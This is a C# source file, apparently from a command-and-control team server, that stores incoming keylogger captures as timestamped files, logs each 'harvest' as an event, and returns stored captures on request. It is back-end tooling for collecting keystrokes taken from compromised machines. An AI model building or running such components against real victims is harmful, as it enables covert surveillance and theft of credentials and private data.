using TeamServer.Interface;
using Trinity.Shared.DTOs.Notification;
using Trinity.Shared.Enums;
using Trinity.Shared.Errors;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Results;

namespace TeamServer.Services;

public sealed class KeyloggerService : IKeyloggerService
{
    private readonly string _dataDirectory;
    private readonly INotificationHub _notificationHub;

    public KeyloggerService(IWebHostEnvironment environment, INotificationHub notificationHub)
    {
        _dataDirectory = Path.Combine(environment.ContentRootPath, "data");
        Directory.CreateDirectory(_dataDirectory);
        _notificationHub = notificationHub;
    }

    public async Task<Result<string>> SaveDataAsync(string data)
    {
        if (data is null)
        {
            return FileError.EmptyFile();
        }

        var fileName = $"keylogger_data_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}.txt";
        var filePath = Path.Combine(_dataDirectory, fileName);

        await File.WriteAllTextAsync(filePath, data);

        // Event log: a harvest landed. The sink has no campaign context, so the entry is broadcast.
        await _notificationHub.SendEventLogAsync(
            string.Empty,
            new EventLog(DateTime.UtcNow, EventLogType.AGENT, $"Keylogger capture stored as '{fileName}'"));

        return fileName;
    }

    public async Task<Result<byte[]>> GetFileAsync(string fileName)
    {
        var safeFileName = Path.GetFileName(fileName);
        if (string.IsNullOrWhiteSpace(safeFileName) || safeFileName is "." or "..")
        {
            return FileError.FileNotFound(fileName);
        }

        var filePath = Path.Combine(_dataDirectory, safeFileName);
        if (!File.Exists(filePath))
        {
            return FileError.FileNotFound(safeFileName);
        }

        return await File.ReadAllBytesAsync(filePath);
    }
}
